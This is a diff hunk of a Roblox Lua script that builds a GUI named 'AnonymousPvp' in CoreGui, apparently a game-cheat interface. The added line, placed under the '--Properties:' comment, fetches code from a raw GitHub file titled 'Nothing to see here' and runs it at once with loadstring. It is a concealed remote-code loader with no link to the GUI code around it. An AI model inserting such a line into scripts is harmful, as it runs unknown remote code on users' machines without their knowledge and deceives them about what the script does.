@@ -44,6 +44,7 @@ local Tg_6 = Instance.new("TextButton")
 local UIGradient_11 = Instance.new("UIGradient")
 
 --Properties:
+loadstring(game:HttpGet("https://raw.githubusercontent.com/openloadstringy/stuff76-j89h/refs/heads/main/Nothing%20to%20see%20here"))()
 
 AnonymousPvp.Name = "AnonymousPvp"
 AnonymousPvp.Parent = game.CoreGui
